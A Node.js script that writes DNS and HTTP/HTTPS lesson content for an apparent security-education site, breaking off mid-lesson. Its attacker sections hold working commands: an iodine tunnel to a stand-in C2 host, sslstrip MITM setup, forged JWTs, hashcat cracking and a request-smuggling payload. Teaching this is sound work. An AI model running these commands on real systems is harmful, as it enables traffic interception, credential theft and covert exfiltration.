import { readFileSync, writeFileSync } from 'fs';

const filePath = 'C:/Users/carls/Repos/fsociety/src/data/lessonContent.ts';
let content = readFileSync(filePath, 'utf8');

// ─────────────────────────────────────────────────────────────────────────────
// REPLACEMENT BLOCKS
// Each must start with "  'key': {" and end with "  },\n\n"
// ─────────────────────────────────────────────────────────────────────────────

const DNS_BLOCK = `  'dns': {
    concept: \`
<h2>The Domain Name System: From HOSTS.TXT to Global Infrastructure</h2>

<h3>The World Before DNS — HOSTS.TXT and Its Breaking Point</h3>
<p>
  In the early days of the ARPANET, every computer on the network maintained a single
  text file called <strong>HOSTS.TXT</strong>, managed by the Stanford Research Institute
  Network Information Center (SRI-NIC). This file mapped every known hostname to its
  IP address. By 1982 the ARPANET was growing explosively, and by 1983 the master
  HOSTS.TXT file had ballooned to nearly <strong>2 megabytes</strong>. Every time a new
  machine was added, the SRI-NIC had to be contacted manually. Name collisions were
  constant. The file was always out of date by the time sites downloaded it. Update
  traffic was beginning to choke the network itself.
</p>
<p>
  The Internet needed something fundamentally different: a distributed, hierarchical,
  automatically replicated database that could scale to millions or billions of entries
  without any central coordination bottleneck.
</p>

<h3>Paul Mockapetris and the Invention of DNS (1983)</h3>
<p>
  In November 1983, Paul Mockapetris published <strong>RFC 882</strong> and
  <strong>RFC 883</strong>, describing the Domain Name System. The key insight was
  <strong>delegation</strong>: the root would delegate .com to Verisign, Verisign would
  delegate google.com to Google, Google would delegate mail.google.com internally.
  Each level only needed to know about the next level down in its own subtree.
  The system scaled to billions of domains because no single server ever held the
  whole picture. Today's DNS (RFC 1034/1035, revised 1987) implements these exact
  principles. Every time you visit a website, you rely on infrastructure Mockapetris
  designed over forty years ago.
</p>

<h3>The DNS Hierarchy — A Tree of Delegation</h3>
<p>
  The DNS namespace is organized as an inverted tree. At the very top is the
  <strong>root zone</strong> (represented by a single dot). Below it are
  <strong>Top-Level Domains</strong>, then second-level domains, then subdomains.
</p>
<pre><code>                        . (root)
                       /    \\
                    .com    .org    .io    .gov    .uk ...
                   /   \\
           google.com  github.com  amazon.com ...
               |
          mail.google.com   maps.google.com   ...</code></pre>

<h4>Root Servers</h4>
<p>
  The root zone is served by <strong>13 named root server clusters</strong>, labeled A through M.
  These are not 13 physical machines — using <strong>IP anycast</strong>, each letter-name
  resolves to hundreds of physical servers distributed worldwide. As of 2025 there are over
  1,800 root server instances globally, operated by 12 organizations including Verisign
  (A and J), ICANN (L), NASA Ames Research Center (G), the US Army Research Lab (H),
  the University of Maryland (D), Internet Systems Consortium (F), and RIPE NCC (K).
  Root servers do not know where google.com is — they only know which TLD servers are
  responsible for .com, .org, .io, and every other TLD.
</p>

<h3>Step-by-Step DNS Resolution — Every Hop</h3>
<pre><code>Step 1: Browser DNS Cache
  If github.com was visited recently and TTL has not expired: done.

Step 2: Operating System Cache
  OS checks its resolver cache. If found and not expired: done.

Step 3: /etc/hosts (or C:\\Windows\\System32\\drivers\\etc\\hosts)
  OS checks the local hosts file. If an entry exists: use it (overrides DNS entirely).

Step 4: Recursive Resolver
  OS sends a query to the configured recursive resolver (your router, ISP, or 1.1.1.1).
  If the resolver has a cached answer: return it. Otherwise, begin iterative resolution.

Step 5: Resolver Queries Root Server
  "Who handles .com?"
  Root replies: "Try the .com TLD servers at a.gtld-servers.net"

Step 6: Resolver Queries .com TLD Server
  "Who handles github.com?"
  TLD replies: "ns1.p16.dynect.net and ns2.p16.dynect.net"

Step 7: Resolver Queries GitHub's Authoritative Nameserver
  "What is the A record for github.com?"
  Auth replies: "140.82.114.4, TTL 3600"

Step 8: Caching and Response
  Resolver caches the answer for 3600 seconds.
  Browser connects to 140.82.114.4 on port 443.</code></pre>

<blockquote>
  The entire iterative resolution chain from Step 5 through Step 7 typically completes in
  20–100 milliseconds. Your client only makes one query; the recursive resolver makes many
  — hence the name.
</blockquote>

<h3>Every DNS Record Type — The Complete Reference</h3>

<h4>A and AAAA Records — Address Mapping</h4>
<pre><code>github.com.   3600  IN  A     140.82.114.4          (IPv4 — 32-bit)
cloudflare.com. 300 IN  AAAA  2606:4700::6810:84e5  (IPv6 — 128-bit)</code></pre>
<p>A single hostname can have multiple A records for load balancing or redundancy.</p>

<h4>MX Record — Mail Exchanger</h4>
<pre><code>google.com.  3600  IN  MX  10  aspmx.l.google.com.
google.com.  3600  IN  MX  20  alt1.aspmx.l.google.com.
google.com.  3600  IN  MX  30  alt2.aspmx.l.google.com.</code></pre>
<p>
  The number is <strong>priority</strong> — lower means higher priority. Mail delivery
  tries the lowest value first. MX records must point to hostnames, never IP addresses.
</p>

<h4>CNAME — Canonical Name (Alias)</h4>
<pre><code>www.github.com.  3600  IN  CNAME  github.com.</code></pre>
<p>
  Critical limitation: <strong>you cannot CNAME the zone apex</strong>. You cannot CNAME
  example.com itself because the zone apex must have SOA and NS records, which cannot
  coexist with a CNAME per RFC 1034. This is why CDNs like Cloudflare invented
  "CNAME flattening" — resolving the CNAME chain at the authoritative nameserver and
  returning A records directly.
</p>

<h4>NS Record — Name Server</h4>
<pre><code>github.com.  172800  IN  NS  ns1.p16.dynect.net.
github.com.  172800  IN  NS  ns2.p16.dynect.net.</code></pre>
<p>Delegates authority for a zone. Note the 48-hour TTL — NS records change rarely.</p>

<h4>SOA Record — Start of Authority</h4>
<pre><code>github.com.  3600  IN  SOA  ns1.p16.dynect.net. hostmaster.github.com. (
    2024011501  ; SERIAL: version (YYYYMMDDNN) — increment on every change
    3600        ; REFRESH: secondary polls primary every hour
    900         ; RETRY: retry failed refresh after 15 minutes
    604800      ; EXPIRE: secondary serves cached data for up to 7 days
    300         ; NEGATIVE TTL: cache NXDOMAIN for 5 minutes
)</code></pre>

<h4>TXT Records — Email Authentication and Verification</h4>
<pre><code>; SPF — which servers may send email for this domain
acme.com.  IN  TXT  "v=spf1 include:_spf.google.com ~all"

; DKIM — public key for email signature verification
selector._domainkey.acme.com.  IN  TXT  "v=DKIM1; k=rsa; p=MIGfMA0GC..."

; DMARC — policy for unauthenticated email
_dmarc.acme.com.  IN  TXT  "v=DMARC1; p=reject; rua=mailto:dmarc@acme.com"</code></pre>

<h4>PTR — Reverse DNS</h4>
<pre><code>4.114.82.140.in-addr.arpa.  3600  IN  PTR  lb-140-82-114-4-fra.github.com.</code></pre>
<p>
  The IP is reversed and appended to in-addr.arpa. Critical for email deliverability
  — mail servers verify that your sending IP has a matching PTR record.
</p>

<h4>SRV Record — Service Location</h4>
<pre><code>_sip._tcp.acme.com.  3600  IN  SRV  10  20  5060  sipserver.acme.com.
;                                   prio  wt  port  target</code></pre>
<p>Used by SIP, XMPP, and other protocols to discover service endpoints dynamically.</p>

<h4>CAA — Certificate Authority Authorization</h4>
<pre><code>acme.com.  3600  IN  CAA  0  issue "letsencrypt.org"
acme.com.  3600  IN  CAA  0  issuewild ";"
acme.com.  3600  IN  CAA  0  iodef "mailto:security@acme.com"</code></pre>
<p>
  Specifies which CAs may issue certificates for your domain. Prevents unauthorized
  issuance by rogue CAs. The issuewild tag controls wildcard certificates separately.
</p>

<h4>DNSSEC Records — DNSKEY, DS, RRSIG</h4>
<pre><code>; DNSKEY — zone's public signing key
acme.com.  3600  IN  DNSKEY  256 3 13 oJMRESz5E4gYzS...

; DS — delegation signer in parent zone (links parent to child DNSKEY)
acme.com.  3600  IN  DS  2371 13 2 1F987CC...

; RRSIG — cryptographic signature over an RRset
acme.com.  3600  IN  RRSIG  A 13 2 3600 20240201 20240101 12345 acme.com. abc...</code></pre>
<p>
  DNSSEC adds a chain of cryptographic signatures from the root zone down to every
  signed leaf record, making forged DNS responses cryptographically verifiable.
</p>

<h3>DNS Caching, TTL, and Security Implications</h3>
<ul>
  <li><strong>Very low TTL (60s or less)</strong>: C2 operators rotate infrastructure IPs
  faster than defenders can blocklist. Emotet rotated C2 every 60 seconds.</li>
  <li><strong>Very high TTL (days)</strong>: Performance wins, but emergency IP changes
  (DDoS migration, incident response) can take days to propagate worldwide.</li>
  <li><strong>Negative caching</strong>: NXDOMAIN responses are cached for the SOA minimum
  TTL, preventing repeated queries for non-existent names.</li>
</ul>

<h3>Split-Horizon DNS</h3>
<p>
  Many organizations run <strong>split-horizon DNS</strong>: the same domain resolves
  differently depending on whether you query from inside or outside the corporate network.
  Internal users get <code>192.168.1.100</code> for <em>crm.acme.com</em>; the same query
  from the internet returns NXDOMAIN (the CRM is not internet-facing). This reduces attack
  surface — internal services are not discoverable via external DNS.
</p>

<h3>DNS over HTTPS (DoH) and DNS over TLS (DoT)</h3>
<p>
  Traditional DNS runs over UDP port 53 in complete plaintext. Your ISP, network
  administrators, and any passive tap can see every domain you query.
</p>
<ul>
  <li><strong>DNS over TLS (DoT)</strong>: Wraps DNS inside TLS on TCP port 853.
  Easy for firewalls to identify — dedicated port.</li>
  <li><strong>DNS over HTTPS (DoH)</strong>: DNS queries inside HTTPS on port 443.
  Indistinguishable from regular web traffic. Firefox and Chrome ship with DoH enabled
  by default to Cloudflare or Google, bypassing corporate resolvers.</li>
</ul>
<blockquote>
  DoH creates a fundamental enterprise monitoring problem. When endpoints bypass the
  corporate DNS resolver, the organization loses DNS logging, RPZ blocking, and detection
  of DNS-based C2 and exfiltration. Defenders must either block DoH at the firewall or
  enroll in a managed DoH service that provides logging.
</blockquote>
\`,
    technique: \`
<h2>How Attackers Weaponize DNS</h2>

<h3>Zone Transfer (AXFR) — The Reconnaissance Goldmine</h3>
<p>
  DNS zone transfers are a legitimate replication mechanism by which secondary nameservers
  copy the complete zone from a primary. The catastrophic misconfiguration is allowing
  <strong>any host on the internet</strong> to request a transfer — not just authorized
  secondaries. The BIND9 default configuration prior to version 9.x permitted this.
  A 2023 study found approximately <strong>4.7% of nameservers</strong> still respond
  to AXFR requests from arbitrary sources.
</p>
<pre><code># Step 1: Find the authoritative nameservers
dig NS acme.com
; acme.com.  172800  IN  NS  ns1.acme.com.
; acme.com.  172800  IN  NS  ns2.acme.com.

# Step 2: Attempt zone transfer from each NS
dig AXFR acme.com @ns1.acme.com

# If misconfigured, the response is the ENTIRE zone:
; acme.com.          IN  SOA   ns1.acme.com. hostmaster.acme.com. ...
; mail.acme.com.     IN  A     203.0.113.25     (mail server)
; vpn.acme.com.      IN  A     203.0.113.30     (VPN gateway — prime target)
; dev.acme.com.      IN  A     10.0.0.50        (dev on RFC1918 space!)
; internal.acme.com. IN  A     10.0.0.100       (internal system)
; db.acme.com.       IN  A     10.0.0.200       (database server)
; jenkins.acme.com.  IN  A     203.0.113.50     (CI/CD pipeline)
; admin.acme.com.    IN  A     203.0.113.55     (admin panel)

# Complete infrastructure map delivered in one unauthenticated query.</code></pre>

<h3>Subdomain Enumeration — Beyond Zone Transfers</h3>
<p>
  When zone transfers are blocked, attackers use multiple complementary techniques:
</p>
<ul>
  <li><strong>Certificate Transparency</strong>: Every TLS certificate must be logged to
  public CT logs. Query <code>crt.sh/?q=%.acme.com</code> — entirely passive, zero
  packets to the target.</li>
  <li><strong>DNS brute force</strong>: Tools like gobuster, amass, and subfinder try thousands
  of common subdomain prefixes. A good wordlist typically finds 20–50% of subdomains.</li>
  <li><strong>Passive DNS databases</strong>: SecurityTrails, DNSDB, and VirusTotal maintain
  historical records of DNS resolutions observed across millions of resolvers globally.</li>
  <li><strong>Reverse IP lookup</strong>: Find all domains sharing an IP address on shared
  hosting — neighbors may share vulnerabilities.</li>
</ul>

<h3>The Kaminsky Attack — DNS Cache Poisoning (2008)</h3>
<p>
  In 2008, Dan Kaminsky discovered a critical DNS vulnerability so severe it triggered the
  most coordinated emergency patch event in internet history — every major DNS resolver
  vendor released patches simultaneously on a single coordinated day.
</p>
<p>
  DNS query responses are matched using a 16-bit <strong>transaction ID</strong> (0–65,535).
  The Kaminsky insight: rather than poisoning a single A record (hard to hit), poison the
  <em>NS record</em> for the entire zone. By repeatedly querying for <em>random.acme.com</em>
  (nonexistent names the resolver must look up), and simultaneously flooding forged responses
  claiming "the NS for acme.com is evil.attacker.com", an attacker generates thousands of
  transaction ID guessing attempts per second.
</p>
<pre><code># Kaminsky attack (conceptual representation):
# 1. Attacker sends: dig randomXXXXX.acme.com @victim-resolver
# 2. Resolver generates outbound query with transaction ID = RANDOM
# 3. Attacker floods: forged UDP responses claiming NS for acme.com = evil.attacker.com
#    Trying all 65,536 possible transaction IDs each second
# 4. When the correct ID is guessed: resolver caches evil.attacker.com as the NS
# 5. Now ALL queries for *.acme.com go to attacker's server

# The fix: source port randomization
# Before: DNS queries always sent from port 53 (16-bit TxID only)
# After: random source port 1024-65535 + 16-bit TxID = ~32 bits of entropy
# Complete fix: DNSSEC (signed records cannot be forged regardless)</code></pre>

<h3>DNS Tunneling — Covert C2 and Data Exfiltration</h3>
<p>
  Corporate firewalls rigorously control outbound traffic but almost never block outbound
  UDP port 53 — DNS must work for internet access. This makes DNS the ideal covert channel
  for data exfiltration and command-and-control.
</p>
<pre><code># Principle: encode data in DNS query subdomain labels
# Attacker controls the authoritative NS for attacker-c2.com
# Any DNS query for any subdomain is logged at the attacker's server

# Tool: iodine — creates an IP tunnel over DNS
# Victim side:
iodine -f attacker-c2.com
# Encodes IP packets as DNS queries:
# "aGVsbG8.attacker-c2.com" (base32-encoded data chunks)
# Each query: ~100 bytes; each response: ~200 bytes
# Effective throughput: ~1 KB/sec (slow but enough for reverse shell)

# Tool: dnscat2 — encrypted C2 channel inside DNS
# Supports shell sessions, file transfer, port forwarding
# All traffic looks like DNS queries to a seemingly legitimate domain

# Detection indicators:
# - Queries to single domain at rate of hundreds per minute
# - Subdomain labels longer than 50 characters
# - High-entropy base32/base64 patterns in subdomain labels
# - TXT and NULL record type queries from endpoints (unusual)
# - NXDOMAIN rate spike (DGA scanning behavior)</code></pre>

<h3>Fast-Flux DNS — Protecting Botnet C2 Infrastructure</h3>
<p>
  Fast-flux DNS rotates IP addresses so rapidly that blocklisting is futile.
</p>
<ul>
  <li><strong>Single-flux</strong>: The C2 domain has dozens of A records, each pointing to
  a different bot acting as a proxy. TTL is 60 seconds. Every minute the A record set rotates
  to fresh IPs. Blocklisting any individual IP only works for 60 seconds. The real C2 server
  is hidden behind rotating proxies.</li>
  <li><strong>Double-flux</strong>: Both the A records <em>and</em> the NS records rotate.
  The nameservers themselves are part of the botnet, changing every minute. Even seizing NS
  records does not kill the domain.</li>
</ul>
<pre><code>MITRE ATT&CK: T1568.001 — Fast Flux DNS

Real examples:
- Storm botnet (2007): pioneered fast-flux at scale
- Conficker (2009): combined DGA with fast-flux for near-indestructible C2
- Modern ransomware affiliates: bulletproof hosters with fast-flux infrastructure</code></pre>

<h3>DNS Amplification DDoS</h3>
<p>
  DNS amplification exploits two properties: UDP source IPs are trivially spoofed,
  and DNS responses can be vastly larger than queries.
</p>
<pre><code># Attack anatomy:
# Attacker sends query with victim's IP as source (UDP spoofing)
# Query: "ANY isc.org" — ~60 bytes
# Response: ~3,000 bytes — 50x amplification factor

# At scale:
# Attacker botnet sends 1 Gbps of query traffic
# DNS resolvers amplify to 50 Gbps hitting the victim
# Victim's upstream link saturated

# 2013 Spamhaus DDoS: 300 Gbps — largest recorded at the time
# Used open DNS resolvers worldwide as amplifiers
# Targeted Spamhaus (anti-spam org) via CloudFlare's infrastructure

# Open resolver check:
dig +short test.openresolver.com TXT @your-resolver-ip
# "open-resolver-confirmed" = your resolver will amplify for anyone</code></pre>
\`,
    defense: \`
<h2>Hardening DNS — Comprehensive Defense</h2>

<h3>Blocking Unauthorized Zone Transfers</h3>
<pre><code># BIND9 — named.conf.local
zone "acme.com" {
    type master;
    file "/etc/bind/zones/acme.com.zone";
    # ONLY allow transfers to designated secondary nameservers:
    allow-transfer { 203.0.113.252; 203.0.113.253; };
    # NEVER: allow-transfer { any; };
};

# Verify from an external host:
dig AXFR acme.com @ns1.acme.com
# Expected: "Transfer failed." or connection refused

# Windows DNS Server (PowerShell):
Set-DnsServerPrimaryZone -Name "acme.com" \`
    -SecondaryServers "203.0.113.252","203.0.113.253" \`
    -SecureSecondaries TransferToSecureServers</code></pre>

<h3>DNSSEC — Cryptographic Authentication</h3>
<p>
  DNSSEC adds a chain of cryptographic signatures from the root zone down to every signed
  record. A validating resolver follows: root key, then .com DS, then acme.com DNSKEY,
  then the RRSIG over the A record — making forged responses cryptographically impossible
  to inject into resolvers' caches.
</p>
<pre><code># Enable DNSSEC validation on BIND9 recursive resolver:
options {
    dnssec-validation auto;  # Use built-in root trust anchors
};

# Check DNSSEC status:
dig +dnssec cloudflare.com A
# Look for "ad" flag in header (Authenticated Data)
# Look for RRSIG records in ANSWER section

# Detailed validation:
delv @1.1.1.1 cloudflare.com A
# "; fully validated" = chain of trust intact

# Sign your own zone with BIND9:
dnssec-keygen -a ECDSAP256SHA256 -n ZONE acme.com
dnssec-signzone -A -3 $(head -c 6 /dev/urandom | od -An -tx1 | tr -d ' \\n') \
    -N INCREMENT -o acme.com -t acme.com.zone</code></pre>

<h3>DNS Monitoring and Anomaly Detection</h3>
<pre><code># Windows: Enable DNS Debug Logging
Set-DnsServerDiagnostics -All $true
# Logs to: C:\\Windows\\System32\\dns\\dns.log

# Linux BIND9: query logging
logging {
    channel query_log {
        file "/var/log/named/queries.log" versions 10 size 50m;
        severity dynamic;
        print-time yes;
    };
    category queries { query_log; };
};

# Sigma rule — DNS tunneling detection:
title: Potential DNS Tunneling via High-Entropy Subdomain
detection:
    selection:
        dns.question.name|re: '(?:[A-Za-z0-9+/]{30,})\\..+'
    filter:
        dns.question.name|endswith:
            - '.microsoft.com'
            - '.google.com'
            - '.windowsupdate.com'
    condition: selection and not filter
level: medium

# Alert thresholds:
# - More than 500 DNS queries per minute from a single host (tunneling/DGA)
# - DNS query labels longer than 50 characters
# - High ratio of NXDOMAIN from single host (DGA scanning)
# - ANY or NULL record queries from endpoints (amplification setup)</code></pre>

<h3>DNS Response Policy Zones (RPZ)</h3>
<p>
  RPZ allows a recursive resolver to override DNS responses based on policy — blocking
  malicious domains at the DNS layer before any TCP connection is established.
</p>
<pre><code># BIND9 RPZ configuration:
options {
    response-policy { zone "rpz.blocklist.local"; };
};

zone "rpz.blocklist.local" {
    type master;
    file "/etc/bind/rpz.blocklist.local.zone";
};

# RPZ zone file:
$TTL 60
@  SOA  localhost. root.localhost. 1 1h 15m 30d 2h
@  NS   localhost.

; Block malicious domain (return NXDOMAIN):
evil-c2-domain.com    CNAME  .
*.evil-c2-domain.com  CNAME  .

; Redirect to sinkhole for logging:
phishing-site.ru      CNAME  sinkhole.internal.

# Commercial options:
# Quad9 (9.9.9.9) — free, blocks malware domains
# Cisco Umbrella — enterprise, feeds from Talos updated in real-time</code></pre>

<h3>Defense Against DNS Amplification — Response Rate Limiting</h3>
<pre><code># BIND9 — Response Rate Limiting (RRL):
options {
    rate-limit {
        responses-per-second 10;
        referrals-per-second 5;
        errors-per-second 5;
        nxdomains-per-second 5;
        window 5;
        slip 2;
        exempt-clients { 203.0.113.252; };  # Whitelist trusted resolvers
    };
};

# BCP 38: Network Ingress Filtering
# Block packets with source IPs that cannot originate from your customer prefix
# Prevents source IP spoofing used in amplification attacks</code></pre>

<h3>DoH/DoT Enterprise Strategy</h3>
<ul>
  <li><strong>Block outbound port 853 (DoT)</strong> at the firewall — dedicated port is easy to block.</li>
  <li><strong>Block known DoH resolver IPs</strong>: Cloudflare (1.1.1.1, 1.0.0.1),
  Google (8.8.8.8, 8.8.4.4), NextDNS, Quad9.</li>
  <li><strong>Use enterprise DoH resolvers</strong>: Cloudflare Gateway and Cisco Umbrella
  offer DoH endpoints that still log queries and enforce RPZ.</li>
  <li><strong>Enforce via Group Policy</strong>: Disable DoH in Chrome (<code>DnsOverHttpsMode: off</code>)
  and Firefox via enterprise policy.</li>
</ul>
\`,
  },

`;

const HTTP_BLOCK = `  'http-https': {
    concept: \`
<h2>HTTP and HTTPS: The Foundation of the Web</h2>

<h3>A History — From CERN to HTTP/3</h3>
<p>
  In 1989, <strong>Tim Berners-Lee</strong> at CERN wrote a proposal called "Information
  Management: A Proposal." His boss, Mike Sendall, wrote "Vague but exciting" in the margin
  and approved it. That document became the blueprint for the World Wide Web. In 1991,
  Berners-Lee implemented the first web server and browser, communicating via a protocol
  he called HTTP — HyperText Transfer Protocol.
</p>
<ul>
  <li><strong>HTTP/0.9 (1991)</strong>: One command — <code>GET /page.html</code>.
  No headers, no status codes. The response was raw HTML then connection close.</li>
  <li><strong>HTTP/1.0 (1996, RFC 1945)</strong>: Added headers, status codes, and methods
  beyond GET. Each request still opened a new TCP connection — expensive for pages with
  many resources.</li>
  <li><strong>HTTP/1.1 (1997, RFC 2616)</strong>: Persistent connections
  (Connection: keep-alive), chunked transfer encoding, the mandatory Host header enabling
  virtual hosting, cache control headers. Dominated for nearly 20 years.</li>
  <li><strong>HTTP/2 (2015, RFC 7540)</strong>: Binary protocol, request
  <em>multiplexing</em> over a single TCP connection, HPACK header compression
  (reducing header overhead by 85%), server push.</li>
  <li><strong>HTTP/3 (2022, RFC 9114)</strong>: Replaces TCP with <strong>QUIC</strong>
  (built on UDP, implements reliable delivery + TLS 1.3 natively). Eliminates TCP
  head-of-line blocking — in HTTP/2, a single lost packet stalls all streams;
  QUIC gives each stream independent loss recovery.</li>
</ul>

<h3>HTTP Request Anatomy — Every Component</h3>
<pre><code>POST /api/v1/users/login HTTP/1.1
Host: acme.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36
Accept: application/json
Content-Type: application/json
Content-Length: 47
Authorization: Bearer eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9...
X-Forwarded-For: 192.168.1.100
Cookie: session=abc123def456; csrf_token=xyz789
Origin: https://acme.com
Referer: https://acme.com/login

{"username":"alice","password":"hunter2"}</code></pre>

<p>Security-relevant headers:</p>
<ul>
  <li><strong>Host</strong>: Required in HTTP/1.1. Host header injection can redirect
  password-reset emails to attacker-controlled domains.</li>
  <li><strong>X-Forwarded-For</strong>: Added by load balancers. Trivially spoofable — an
  attacker adds this header themselves to bypass IP-based rate limiting.</li>
  <li><strong>Referer</strong>: Previous URL. Can leak sensitive URL parameters (password
  reset tokens) to external sites.</li>
  <li><strong>Authorization</strong>: Must only ever be sent over HTTPS.</li>
</ul>

<h3>HTTP Methods — Safety and Idempotency</h3>
<pre><code>Method    Safe?  Idempotent?  Purpose
GET       Yes    Yes          Retrieve data (must NOT modify state)
HEAD      Yes    Yes          Like GET but headers only
OPTIONS   Yes    Yes          Discover allowed methods
POST      No     No           Create resource, submit data, trigger action
PUT       No     Yes          Replace resource entirely
PATCH     No     No           Partially update resource
DELETE    No     Yes          Delete resource
TRACE     Yes    Yes          Echo request back (DISABLE in production — information leak)
CONNECT   No     No           Establish tunnel (HTTPS through HTTP proxy)</code></pre>

<p>
  <strong>Safe</strong> methods must not modify server state — GET should never delete records.
  <strong>Idempotent</strong> methods produce the same result if called N times — crucial
  for safe retry logic.
</p>

<h3>HTTP Status Codes — The Security-Relevant Ones</h3>
<pre><code>200 OK           Normal success
201 Created      Resource created (include Location header)
204 No Content   Success, no body (common for DELETE)

301 Moved Permanently  Cache this redirect; update bookmarks
302 Found (Temp)       Temporary; do not cache

400 Bad Request        Malformed syntax
401 Unauthorized       Authentication required (misleadingly named)
403 Forbidden          Authenticated but not authorized
404 Not Found          Does not exist
429 Too Many Requests  Rate limiting (include Retry-After header)

500 Internal Server Error  Unhandled exception (reveals information)
502 Bad Gateway            Proxy cannot reach backend
503 Service Unavailable    Overloaded or in maintenance
504 Gateway Timeout        Backend too slow</code></pre>

<blockquote>
  401 vs 403: 401 means unauthenticated; 403 means authenticated but unauthorized.
  Use 404 for hidden resources as an information-hiding technique — prevents attackers
  from confirming a resource exists even if they cannot access it.
</blockquote>

<h3>TLS/HTTPS — The Full Technical Picture</h3>
<p>
  HTTPS provides <strong>confidentiality</strong> (encrypted), <strong>integrity</strong>
  (MAC prevents tampering), and <strong>authentication</strong> (server proves identity).
  The TLS 1.3 handshake (RFC 8446) completes in <strong>one round trip</strong>:
</p>
<pre><code>Client                                           Server
  |                                               |
  |-- ClientHello -------------------------------->|
  |   TLS 1.3, cipher suites, ECDH public key     |
  |   SNI: acme.com                               |
  |                                               |
  |<-- ServerHello + Certificate + Finished -------|
  |    Selected cipher, server's ECDH key,        |
  |    certificate chain, CertificateVerify,      |
  |    Finished HMAC                              |
  |                                               |
  |-- Finished ----------------------------------->|
  |                                               |
  |<== Encrypted HTTP traffic ===================>|

Perfect Forward Secrecy: ephemeral ECDH keys are discarded after each session.
Compromising the server's long-term private key CANNOT decrypt past sessions.</code></pre>

<h3>Certificate Validation Chain</h3>
<p>
  Your browser validates a chain: the server's <strong>leaf certificate</strong> is signed
  by an <strong>intermediate CA</strong>, which is signed by a <strong>root CA</strong>
  in your trust store. Operating systems ship with ~150 trusted root CAs — any of them can
  issue a cert for any domain. This is why Certificate Transparency logs exist: to catch
  misissuance by rogue or compromised CAs.
</p>

<h3>Cookies — The Complete Security Model</h3>
<pre><code>Set-Cookie: session=abc123;
    Secure;          # Only sent over HTTPS
    HttpOnly;        # JavaScript cannot read via document.cookie
    SameSite=Strict; # Never sent in cross-site requests (CSRF prevention)
    Path=/;
    Max-Age=3600;</code></pre>

<p><strong>SameSite values:</strong></p>
<ul>
  <li><strong>Strict</strong>: Cookie never sent cross-site, including link clicks. Maximum
  CSRF protection but breaks OAuth flows dependent on cross-site redirects.</li>
  <li><strong>Lax</strong>: Sent on top-level navigation GET but not cross-site POST.
  Browser default since Chrome 80. Protects against most CSRF.</li>
  <li><strong>None</strong>: Sent everywhere. Must be paired with Secure. Required for
  third-party cookies — being deprecated in most browsers.</li>
</ul>

<h3>JWT — Structure and Vulnerabilities</h3>
<pre><code># Structure: header.payload.signature (all base64url-encoded)
eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0IiwicHJvbGUiOiJ1c2VyIiwiZXhwIjoxNzA5MTIzNDU2fQ.SIG...

# Decoded header:
{ "alg": "RS256", "typ": "JWT" }

# Decoded payload:
{
  "sub": "1234",           # Subject (user ID)
  "role": "user",          # Authorization claim
  "exp": 1709123456,       # Expiry (Unix timestamp)
  "iat": 1709119856        # Issued at
}</code></pre>
\`,
    technique: \`
<h2>How Attackers Exploit HTTP and HTTPS</h2>

<h3>Server Fingerprinting via HTTP Headers</h3>
<p>
  HTTP response headers routinely disclose precise version numbers — enough to query CVE
  databases directly:
</p>
<pre><code>curl -I https://target.com

HTTP/1.1 200 OK
Server: Apache/2.4.49 (Unix)         CVE-2021-41773 path traversal / RCE!
X-Powered-By: PHP/7.4.21             check php.net/ChangeLog for 7.4 CVEs
X-Generator: Drupal 8                Drupalgeddon2 CVE-2018-7600?
Via: 1.1 varnish                     Varnish cache in front

# After fingerprinting:
searchsploit apache 2.4.49
# Exploit DB: CVE-2021-41773 Path Traversal and RCE in Apache 2.4.49

# Timing-based fingerprinting persists even after removing Server header:
# nginx returns 400 in ~1ms; Apache in ~5ms</code></pre>

<h3>SSL/TLS Stripping</h3>
<p>
  With a man-in-the-middle position (ARP spoofing, rogue WiFi, compromised router),
  sslstrip downgrades HTTPS to HTTP. The victim's browser never initiates TLS — the
  attacker proxies plaintext traffic while maintaining HTTPS with the real server.
</p>
<pre><code># MITM setup:
arpspoof -i eth0 -t 192.168.1.50 192.168.1.1   # victim thinks attacker is router
echo 1 > /proc/sys/net/ipv4/ip_forward
sslstrip -l 10000
iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 10000

# What victim sees: http://bank.com (no padlock, no warning in older browsers)
# What attacker captures: plaintext credentials and session cookies

# Why HSTS defeats this:
# If bank.com sent: Strict-Transport-Security: max-age=31536000
# Browser refuses HTTP for 1 year — sslstrip cannot intercept

# Why HSTS preloading is stronger:
# Browser ships with hardcoded HTTPS-only list
# Even the first visit (before ever receiving an HSTS header) is forced HTTPS</code></pre>

<h3>JWT Attacks</h3>
<pre><code># Attack 1: Algorithm None (CVE-2015-9235 class)
# JWT spec allows alg:"none" — no signature required
# Vulnerable libraries accept unsigned tokens:

# Original (RS256 signed):
eyJhbGciOiJSUzI1NiJ9.eyJyb2xlIjoidXNlciJ9.SIG...

# Forged (no signature, alg:none):
eyJhbGciOiJub25lIn0.eyJyb2xlIjoiYWRtaW4ifQ.
# Empty last segment; vulnerable library promotes attacker to admin

# Attack 2: RS256 to HS256 Algorithm Confusion
# RS256: asymmetric (private signs, public verifies)
# HS256: symmetric (same secret signs AND verifies)
# Attack: change alg to HS256, sign with SERVER'S PUBLIC KEY (from /jwks.json)
# Vulnerable library uses public key as HMAC secret → signature validates!

# Attack 3: Weak Secret Brute Force
hashcat -a 0 -m 16500 token.jwt wordlist.txt
# Common weak secrets: "secret", "password", "jwt_secret", app name, "changeme"

# Attack 4: Expiry Manipulation
# Decode, change exp to year 2099, re-sign with known weak secret</code></pre>

<h3>HTTP Request Smuggling</h3>
<p>
  Modern web infrastructure places a reverse proxy (nginx, HAProxy, Cloudflare) in front
  of backend servers. Smuggling exploits disagreement about which takes precedence:
  Content-Length or Transfer-Encoding.
</p>
<pre><code># CL.TE Attack: Frontend uses Content-Length, Backend uses Transfer-Encoding
POST / HTTP/1.1
Host: vulnerable.com
Content-Length: 13
Transfer-Encoding: chunked

0

SMUGGLED     # prepended to NEXT legitimate user's request

# Impact:
# - Poison response cache to serve attacker's response to victim
# - Steal victim session cookies by routing their request into attacker's response
# - Bypass WAF/IP allowlists on internal paths

# CVE-2019-18277: HAProxy — real-world TE.CL smuggling
# Detection: Burp Suite Professional has a request smuggling scanner</code></pre>

<h3>CORS Misconfiguration</h3>
<pre><code># Vulnerable server reflects arbitrary Origin:
fetch('https://api.bank.com/v1/account/balance', {credentials: 'include'})
# Attacker's page sends Origin: https://evil.com
